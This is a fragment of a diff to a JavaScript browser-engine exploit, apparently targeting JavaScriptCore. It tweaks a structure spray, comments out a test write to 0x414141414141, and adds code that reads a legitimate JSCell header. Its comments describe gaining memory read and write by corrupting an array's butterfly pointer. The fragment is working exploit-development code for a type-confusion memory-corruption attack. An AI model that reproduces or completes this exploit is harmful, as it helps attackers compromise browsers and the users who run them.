@@ -391,9 +391,9 @@ var qwordAsFloat = qword => { //i2f
     }
     var structure_spray = [];
 for (var i = 0; i < 1000; ++i) {
-    var ary = [13.37];
-    ary.prop = 13.37;
-    ary['p'+i] = 13.37;
+    var ary = [1337];
+    ary.prop = 1337;
+    ary['p'+i] = 1337;
     structure_spray.push(ary);
 }
     var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
@@ -502,12 +502,20 @@ for (var i = 0; i < 1000; ++i) {
     // Can now simply read a legitimate JSCell header and use it.
     var js_header = hax[0];
     container.header = js_header; 
-    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
     
     // Can read/write to memory now by corrupting the butterfly
     // pointer of the float array.
-    hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
-    victim1[0] = 1337;
+    //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
+    //victim1[0] = 1337;
+    let results = [];
+    for (let i = 0; i < 2; i++) {
+        let a = i == 0 ? hax : victim1;
+        results.push(a[0]);
+    }
+    jscell_header = results[0];
+    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    
     /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
